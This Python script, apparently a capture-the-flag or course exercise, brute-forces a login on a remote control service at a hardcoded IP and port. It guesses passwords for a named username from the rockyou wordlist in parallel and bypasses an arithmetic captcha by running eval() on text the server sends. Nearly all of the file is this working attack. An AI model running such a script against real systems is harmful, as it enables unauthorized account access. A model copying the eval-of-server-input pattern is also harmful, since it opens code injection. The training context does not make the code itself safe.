"""
    If you know the IP address of v0idcache's server and you
    know the port number of the service you are trying to connect
    to, you can use nc or telnet in your Linux terminal to interface
    with the server. To do so, run:

        $ nc <ip address here> <port here>

    In the above the example, the $-sign represents the shell, nc is the command
    you run to establish a connection with the server using an explicit IP address
    and port number.

    If you have the discovered the IP address and port number, you should discover
    that there is a remote control service behind a certain port. You will know you
    have discovered the correct port if you are greeted with a login prompt when you
    nc to the server.

    In this Python script, we are mimicking the same behavior of nc'ing to the remote
    control service, however we do so in an automated fashion. This is because it is
    beneficial to script the process of attempting multiple login attempts, hoping that
    one of our guesses logs us (the attacker) into the Briong server.

    Feel free to optimize the code (ie. multithreading, etc) if you feel it is necessary.

"""

import socket
from time import sleep
from multiprocessing import Pool

host = "157.230.179.99"
port = 1337
wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
username = "ejnorman84"

def brute_force():
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command

        General idea:

            Given that you know a potential username, use a wordlist and iterate
            through each possible password and repeatedly attempt to login to
            v0idcache's server.
    """


    passwords = open(wordlist, 'r').read().split('\n')

    p = Pool()

    print(set(p.map(try_pass, passwords)))

def try_pass(password):
    #print(password)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    sleep(2)

    try:
        solve_captcha(s)
    except SyntaxError:
        solve_captcha(s, True)

    data = s.recv(1024)

    s.send(username + '\n')
    data = s.recv(1024)
    print("Trying password: " + password)
    s.send(password + '\n')
    sleep(.5)
    data = s.recv(1024)
    if data[:4] == 'Fail':
        print("Fail")
        return ("Fail", password)
    else:
        print("Possible password: " + password + data)
        return ("Maybe", password + data)

def solve_captcha(soc, again=False):
    data = soc.recv(1024).split('\n')
    #print(data)
    if again:
        captcha = data[0].split('=')[0]
    else:
        captcha = data[2].split('=')[0]
    soc.send(str(eval(captcha)) + '\n')

if __name__ == '__main__':
    brute_force()